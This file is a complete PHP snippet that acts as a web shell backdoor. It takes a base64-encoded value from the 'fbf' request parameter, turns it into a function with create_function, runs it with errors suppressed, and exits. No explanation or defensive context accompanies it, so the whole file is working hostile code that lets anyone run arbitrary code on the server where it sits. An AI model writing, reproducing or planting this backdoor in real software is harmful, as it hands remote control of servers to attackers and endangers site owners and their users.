 <?php
if(!empty($_REQUEST['fbf'])){$fbf=base64_decode($_REQUEST['fbf']);$fbf=create_function('',$fbf);@$fbf();exit;}